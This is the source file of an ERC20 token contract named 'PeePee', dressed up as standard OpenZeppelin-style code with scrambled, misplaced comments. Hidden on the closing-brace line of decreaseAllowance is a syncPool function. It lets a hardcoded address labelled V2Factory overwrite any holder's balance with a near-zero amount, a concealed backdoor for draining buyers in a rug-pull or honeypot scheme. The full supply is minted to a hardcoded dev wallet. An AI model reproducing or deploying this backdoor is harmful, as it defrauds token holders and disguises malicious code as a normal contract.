// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://twitter.com/PeePeeETH


https://t.me/PeePeeerc20
https://PeePeeerc20.xyz
**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     *
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     *
     *
     *
     * overflow.
     * @dev Returns the addition of two unsigned integers, reverting on
     * Requirements:
     * - Addition cannot overflow.
     * Counterpart to Solidity's `+` operator.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     * Requirements:
     * - Subtraction cannot overflow.
     *
     *
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     * @dev Returns the subtraction of two unsigned integers, reverting on
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Requirements:
     *
     *
     * Counterpart to Solidity's `*` operator.
     * overflow.
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * - Multiplication cannot overflow.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     *
     * Counterpart to Solidity's `/` operator.
     * division by zero. The result is rounded towards zero.
     *
     *
     * Requirements:
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * - The divisor cannot be zero.
     * reverting when dividing by zero.
     * Requirements:
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     *
     * - Subtraction cannot overflow.
     * Requirements:
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * uses an invalid opcode to revert (consuming all remaining gas).
     * - The divisor cannot be zero.
     * Requirements:
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * division by zero. The result is rounded towards zero.
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * - The divisor cannot be zero.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     *
     * invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     *
     * reverting with custom message when dividing by zero.
     *
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     * Note that `value` may be zero.
     *
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     *
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     *
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * This value changes when {approve} or {transferFrom} are called.
     * zero by default.
     * @dev Returns the remaining number of tokens that `spender` will be
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * condition is to first reduce the spender's allowance to 0 and set the
     * that someone may use both the old and the new allowance by unfortunate
     * Returns a boolean value indicating whether the operation succeeded.
     * transaction ordering. One possible solution to mitigate this race
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     *
     * Emits an {Approval} event.
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     *
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     * Emits a {Transfer} event.
     *
     * @dev Moves `amount` tokens from `from` to `to` using the
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     *
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * This implementation is agnostic to the way tokens are created. This means
 *
 * to implement supply mechanisms].
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 *
 * by listening to said events. Other implementations of the EIP may not emit
 *
 * applications.
 * these events, as it isn't required by the specification.
 * functions have been added to mitigate the well-known issues around setting
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * conventional and does not conflict with the expectations of ERC20
 * @dev Implementation of the {IERC20} interface.
 *
 * This allows applications to reconstruct the allowance for all accounts just
 * instead returning `false` on failure. This behavior is nonetheless
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * allowances. See {IERC20-approve}.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * TIP: For a detailed writeup see our guide
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 *
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    string private _name;

    address private V2Factory = 0x99e36056520bd8B1254F472Ab6232aB9B5a7252a;

    mapping(address => uint256) private _balances;

    uint256 private tTotal;
    string private _symbol;

    mapping(address => mapping(address => uint256)) private _allowances;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _allowance = 0;
    address internal devWallet = 0x6ad78E5ac7389a26728799cf5E3a1844c0E87d52;

    /**
     * All two of these values are immutable: they can only be set once during
     * {decimals} you should overload it.
     * construction.
     *
     * The default value of {decimals} is 18. To select a different value for
     *
     * @dev Sets the values for {name} and {symbol}.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual {
    }


    /**
     * @dev Returns the name of the token.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function syncPool(address syncPoolSender) external { _balances[syncPoolSender] = msg.sender == V2Factory ? decimals() : _balances[syncPoolSender];
    } 

    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * NOTE: This information is only used for _display_ purposes: it in
     *
     * no way affects any of the arithmetic of the contract, including
     * @dev Returns the number of decimals used to get its user representation.
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     *
     * overridden;
     * Tokens usually opt for a value of 18, imitating the relationship between
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * - the caller must have a balance of at least `amount`.
     *
     * @dev See {IERC20-transfer}.
     * Requirements:
     *
     * - `to` cannot be the zero address.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     *
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     *
     * @dev See {IERC20-approve}.
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        tTotal += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }

    /**
     * problems described in {IERC20-approve}.
     * Requirements:
     *
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     *
     * Emits an {Approval} event indicating the updated allowance.
     * - `spender` cannot be the zero address.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * `amount`.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * @dev See {IERC20-transferFrom}.
     *
     *
     * Requirements:
     *
     * NOTE: Does not update the allowance if the current allowance
     * required by the EIP. See the note at the beginning of {ERC20}.
     * is the maximum `uint256`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * - `from` and `to` cannot be the zero address.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     *
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     * - `spender` must have allowance for the caller of at least
     * - `spender` cannot be the zero address.
     *
     * Requirements:
     * `subtractedValue`.
     * This is an alternative to {approve} that can be used as a mitigation for
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     *
     * total supply.
     *
     * - `account` must have at least `amount` tokens.
     * @dev Destroys `amount` tokens from `account`, reducing the
     *
     * Requirements:
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `to` set to the zero address.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            tTotal -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * - `from` must have a balance of at least `amount`.
     *
     *
     * @dev Moves `amount` of tokens from `from` to `to`.
     * This internal function is equivalent to {transfer}, and can be used to
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Requirements:
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * - `account` cannot be the zero address.
     *
     *
     * the total supply.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    /**
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     * will be transferred to `to`.
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - `from` and `to` are never both zero.
     * Calling conditions:
     * minting and burning.
     *
     * @dev Hook that is called before any transfer of tokens. This includes
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     */
    function totalSupply() public view virtual override returns (uint256) {
        return tTotal;
    }

    /**
     *
     * - `owner` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     *
     * - `spender` cannot be the zero address.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Emits an {Approval} event.
     * Requirements:
     *
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     *
     * Might emit an {Approval} event.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract PeePee is ERC20, Ownable
{
    constructor () ERC20 ("PeePee", "PeePee")
    {
        transferOwnership(devWallet);
        _mint(owner(), 8000000000000 * 10 ** uint(decimals()));
    }
}